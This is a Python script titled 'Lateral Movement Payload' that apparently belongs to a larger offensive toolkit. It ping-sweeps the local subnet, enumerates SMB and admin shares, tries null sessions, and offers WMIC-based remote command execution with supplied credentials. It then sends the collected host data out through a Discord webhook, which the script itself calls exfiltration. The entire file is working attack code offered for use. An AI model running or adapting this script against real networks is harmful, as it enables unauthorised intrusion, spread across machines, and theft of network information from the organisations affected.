#!/usr/bin/env python3
"""
Lateral Movement Payload
Techniques for moving across network and systems
"""

import subprocess
import platform
import socket
import os
from typing import List, Dict, Optional

# Import Discord webhook utilities from parent directory
import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent))
from webhook_utils import send_to_discord


def scan_network_hosts(subnet: str = "192.168.1") -> List[str]:
    """
    Scan network for active hosts
    
    Args:
        subnet: Subnet to scan (e.g., "192.168.1")
    
    Returns:
        List of active IP addresses
    """
    active_hosts = []
    
    print(f"🔍 Scanning {subnet}.0/24 network...")
    
    for i in range(1, 255):
        ip = f"{subnet}.{i}"
        
        # Quick ping check
        if platform.system() == 'Windows':
            ping_cmd = ['ping', '-n', '1', '-w', '100', ip]
        else:
            ping_cmd = ['ping', '-c', '1', '-W', '1', ip]
        
        try:
            result = subprocess.run(
                ping_cmd,
                capture_output=True,
                timeout=1
            )
            
            if result.returncode == 0:
                active_hosts.append(ip)
                print(f"   ✓ {ip} - Active")
        except:
            pass
    
    return active_hosts


def enumerate_smb_shares(target_ip: str) -> List[str]:
    """
    Enumerate SMB shares on target (Windows)
    
    Args:
        target_ip: Target IP address
    
    Returns:
        List of share names
    """
    shares = []
    
    if platform.system() != 'Windows':
        return shares
    
    try:
        result = subprocess.run(
            ['net', 'view', f'\\\\{target_ip}'],
            capture_output=True,
            text=True,
            timeout=5
        )
        
        # Parse output
        lines = result.stdout.split('\n')
        for line in lines:
            if 'Disk' in line or 'Print' in line:
                share_name = line.split()[0]
                shares.append(share_name)
    
    except:
        pass
    
    return shares


def attempt_null_session(target_ip: str) -> bool:
    """
    Attempt null session connection (Windows)
    
    Args:
        target_ip: Target IP
    
    Returns:
        True if successful
    """
    if platform.system() != 'Windows':
        return False
    
    try:
        result = subprocess.run(
            ['net', 'use', f'\\\\{target_ip}\\IPC$', '/user:', ''],
            capture_output=True,
            timeout=5
        )
        
        return result.returncode == 0
    
    except:
        return False


def execute_remote_command(target_ip: str, username: str, password: str, command: str) -> Optional[str]:
    """
    Execute command on remote Windows system via WMI
    Requires credentials
    
    Args:
        target_ip: Target IP
        username: Username
        password: Password
        command: Command to execute
    
    Returns:
        Command output or None
    """
    if platform.system() != 'Windows':
        return None
    
    try:
        # Use wmic for remote command execution
        wmic_cmd = [
            'wmic',
            f'/node:{target_ip}',
            f'/user:{username}',
            f'/password:{password}',
            'process', 'call', 'create',
            f'"{command}"'
        ]
        
        result = subprocess.run(
            wmic_cmd,
            capture_output=True,
            text=True,
            timeout=10
        )
        
        return result.stdout
    
    except Exception as e:
        return f"Error: {e}"


def check_admin_shares(target_ip: str) -> Dict[str, bool]:
    """
    Check for accessible admin shares (C$, ADMIN$, IPC$)
    
    Args:
        target_ip: Target IP
    
    Returns:
        Dict of share accessibility
    """
    admin_shares = {
        'C$': False,
        'ADMIN$': False,
        'IPC$': False
    }
    
    if platform.system() != 'Windows':
        return admin_shares
    
    for share in admin_shares.keys():
        try:
            result = subprocess.run(
                ['dir', f'\\\\{target_ip}\\{share}'],
                capture_output=True,
                timeout=3
            )
            
            admin_shares[share] = (result.returncode == 0)
        
        except:
            pass
    
    return admin_shares


def main():
    """
    Main lateral movement operation
    """
    print("=" * 60)
    print("LATERAL MOVEMENT PAYLOAD")
    print("=" * 60)
    print(f"Host: {socket.gethostname()}")
    print(f"IP: {socket.gethostbyname(socket.gethostname())}")
    print()
    
    data = {
        "hostname": socket.gethostname(),
        "local_ip": socket.gethostbyname(socket.gethostname()),
        "platform": platform.system()
    }
    
    # Determine local subnet
    local_ip = socket.gethostbyname(socket.gethostname())
    subnet = '.'.join(local_ip.split('.')[:-1])
    
    # Scan network
    print(f"\n📡 Network Reconnaissance")
    print("-" * 60)
    
    active_hosts = scan_network_hosts(subnet)
    data['active_hosts'] = active_hosts
    print(f"\n✓ Found {len(active_hosts)} active hosts")
    
    # Enumerate shares on each host
    host_details = {}
    for host in active_hosts[:5]:  # Limit to first 5 to avoid noise
        print(f"\n🔍 Enumerating {host}...")
        
        shares = enumerate_smb_shares(host)
        admin_access = check_admin_shares(host)
        null_session = attempt_null_session(host)
        
        host_details[host] = {
            'shares': shares,
            'admin_shares': admin_access,
            'null_session': null_session
        }
        
        print(f"   Shares: {', '.join(shares) if shares else 'None'}")
        print(f"   Admin access: {any(admin_access.values())}")
        print(f"   Null session: {null_session}")
    
    data['host_details'] = host_details
    
    # Send to Discord
    print("\n📤 Exfiltrating lateral movement data...")
    if send_to_discord("🔄 Lateral Movement Reconnaissance", data):
        print("✓ Data sent to Discord successfully!")
    else:
        print("✗ Failed to send to Discord")
    
    print("\n" + "=" * 60)


if __name__ == '__main__':
    main()
